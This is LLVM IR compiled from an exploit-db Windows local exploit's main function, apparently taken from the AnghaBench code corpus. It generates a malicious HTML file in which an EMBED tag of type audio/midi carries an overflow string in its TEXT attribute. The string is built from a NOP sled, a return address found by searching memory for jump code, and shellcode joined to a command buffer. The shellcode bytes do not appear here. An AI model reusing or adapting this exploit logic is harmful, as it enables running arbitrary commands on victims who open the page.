; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_19585.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_19585.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@MAXBUF = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [26 x i8] c"usage %s output_htmlfile\0A\00", align 1
@.str.1 = private unnamed_addr constant [3 x i8] c"wb\00", align 1
@FALSE = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [73 x i8] c"<HTML><EMBED\0ATYPE=\22audio/midi\22\0AWIDTH=150\0AHEIGHT=40\0AAUTOSTART=TRUE\0ATEXT=\22\00", align 1
@mems = common dso_local global i64* null, align 8
@.str.3 = private unnamed_addr constant [24 x i8] c"Can not find jmp code.\0A\00", align 1
@.str.4 = private unnamed_addr constant [22 x i8] c"Jumping address : %x\0A\00", align 1
@RETADR = common dso_local global i64 0, align 8
@exploit_code = common dso_local global i32 0, align 4
@cmdbuf = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [14 x i8] c"%s\22\0A>\0A</HTML>\00", align 1
@.str.6 = private unnamed_addr constant [13 x i8] c"%s created.\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i64, align 8
  %11 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %12 = load i32, i32* @MAXBUF, align 4
  %13 = zext i32 %12 to i64
  %14 = call i8* @llvm.stacksave()
  store i8* %14, i8** %9, align 8
  %15 = alloca i8, i64 %13, align 16
  store i64 %13, i64* %10, align 8
  %16 = load i32, i32* %4, align 4
  %17 = icmp slt i32 %16, 2
  br i1 %17, label %18, label %24

18:                                               ; preds = %2
  %19 = load i8**, i8*** %5, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 0
  %21 = load i8*, i8** %20, align 8
  %22 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str, i64 0, i64 0), i8* %21)
  %23 = call i32 @exit(i32 1) #4
  unreachable

24:                                               ; preds = %2
  %25 = load i8**, i8*** %5, align 8
  %26 = getelementptr inbounds i8*, i8** %25, i64 1
  %27 = load i8*, i8** %26, align 8
  %28 = call i32* @fopen(i8* %27, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.1, i64 0, i64 0))
  store i32* %28, i32** %6, align 8
  %29 = icmp eq i32* %28, null
  br i1 %29, label %30, label %32

30:                                               ; preds = %24
  %31 = load i32, i32* @FALSE, align 4
  store i32 %31, i32* %3, align 4
  store i32 1, i32* %11, align 4
  br label %117

32:                                               ; preds = %24
  %33 = load i32*, i32** %6, align 8
  %34 = call i32 (i32*, i8*, ...) @fprintf(i32* %33, i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.2, i64 0, i64 0))
  store i32 0, i32* %7, align 4
  br label %35

35:                                               ; preds = %64, %32
  %36 = load i64*, i64** @mems, align 8
  %37 = load i32, i32* %7, align 4
  %38 = zext i32 %37 to i64
  %39 = getelementptr inbounds i64, i64* %36, i64 %38
  %40 = load i64, i64* %39, align 8
  %41 = icmp eq i64 %40, 0
  br i1 %41, label %42, label %45

42:                                               ; preds = %35
  %43 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.3, i64 0, i64 0))
  %44 = call i32 @exit(i32 1) #4
  unreachable

45:                                               ; preds = %35
  %46 = load i32*, i32** %6, align 8
  %47 = load i64*, i64** @mems, align 8
  %48 = load i32, i32* %7, align 4
  %49 = zext i32 %48 to i64
  %50 = getelementptr inbounds i64, i64* %47, i64 %49
  %51 = load i64, i64* %50, align 8
  %52 = inttoptr i64 %51 to i8*
  %53 = load i64*, i64** @mems, align 8
  %54 = load i32, i32* %7, align 4
  %55 = add i32 %54, 1
  %56 = zext i32 %55 to i64
  %57 = getelementptr inbounds i64, i64* %53, i64 %56
  %58 = load i64, i64* %57, align 8
  %59 = inttoptr i64 %58 to i8*
  %60 = call i32 @search_mem(i32* %46, i8* %52, i8* %59, i32 255, i32 224)
  store i32 %60, i32* %8, align 4
  %61 = icmp ne i32 %60, 0
  br i1 %61, label %62, label %63

62:                                               ; preds = %45
  br label %67

63:                                               ; preds = %45
  br label %64

64:                                               ; preds = %63
  %65 = load i32, i32* %7, align 4
  %66 = add i32 %65, 2
  store i32 %66, i32* %7, align 4
  br label %35

67:                                               ; preds = %62
  %68 = load i32, i32* %8, align 4
  %69 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.4, i64 0, i64 0), i32 %68)
  %70 = load i32, i32* @MAXBUF, align 4
  %71 = call i32 @memset(i8* %15, i32 144, i32 %70)
  %72 = load i32, i32* %8, align 4
  %73 = and i32 %72, 255
  %74 = trunc i32 %73 to i8
  %75 = load i64, i64* @RETADR, align 8
  %76 = getelementptr inbounds i8, i8* %15, i64 %75
  store i8 %74, i8* %76, align 1
  %77 = load i32, i32* %8, align 4
  %78 = lshr i32 %77, 8
  %79 = and i32 %78, 255
  %80 = trunc i32 %79 to i8
  %81 = load i64, i64* @RETADR, align 8
  %82 = add i64 %81, 1
  %83 = getelementptr inbounds i8, i8* %15, i64 %82
  store i8 %80, i8* %83, align 1
  %84 = load i32, i32* %8, align 4
  %85 = lshr i32 %84, 16
  %86 = and i32 %85, 255
  %87 = trunc i32 %86 to i8
  %88 = load i64, i64* @RETADR, align 8
  %89 = add i64 %88, 2
  %90 = getelementptr inbounds i8, i8* %15, i64 %89
  store i8 %87, i8* %90, align 1
  %91 = load i32, i32* %8, align 4
  %92 = lshr i32 %91, 24
  %93 = and i32 %92, 255
  %94 = trunc i32 %93 to i8
  %95 = load i64, i64* @RETADR, align 8
  %96 = add i64 %95, 3
  %97 = getelementptr inbounds i8, i8* %15, i64 %96
  store i8 %94, i8* %97, align 1
  %98 = load i32, i32* @exploit_code, align 4
  %99 = load i32, i32* @cmdbuf, align 4
  %100 = call i32 @strcat(i32 %98, i32 %99)
  %101 = load i32, i32* @exploit_code, align 4
  %102 = load i32, i32* @exploit_code, align 4
  %103 = call i32 @strlen(i32 %102)
  %104 = call i32 @memcpy(i8* %15, i32 %101, i32 %103)
  %105 = load i32, i32* @MAXBUF, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds i8, i8* %15, i64 %106
  store i8 0, i8* %107, align 1
  %108 = load i32*, i32** %6, align 8
  %109 = call i32 (i32*, i8*, ...) @fprintf(i32* %108, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.5, i64 0, i64 0), i8* %15)
  %110 = load i32*, i32** %6, align 8
  %111 = call i32 @fclose(i32* %110)
  %112 = load i8**, i8*** %5, align 8
  %113 = getelementptr inbounds i8*, i8** %112, i64 1
  %114 = load i8*, i8** %113, align 8
  %115 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.6, i64 0, i64 0), i8* %114)
  %116 = load i32, i32* @FALSE, align 4
  store i32 %116, i32* %3, align 4
  store i32 1, i32* %11, align 4
  br label %117

117:                                              ; preds = %67, %30
  %118 = load i8*, i8** %9, align 8
  call void @llvm.stackrestore(i8* %118)
  %119 = load i32, i32* %3, align 4
  ret i32 %119
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @printf(i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32* @fopen(i8*, i8*) #2

declare dso_local i32 @fprintf(i32*, i8*, ...) #2

declare dso_local i32 @search_mem(i32*, i8*, i8*, i32, i32) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @strcat(i32, i32) #2

declare dso_local i32 @memcpy(i8*, i32, i32) #2

declare dso_local i32 @strlen(i32) #2

declare dso_local i32 @fclose(i32*) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
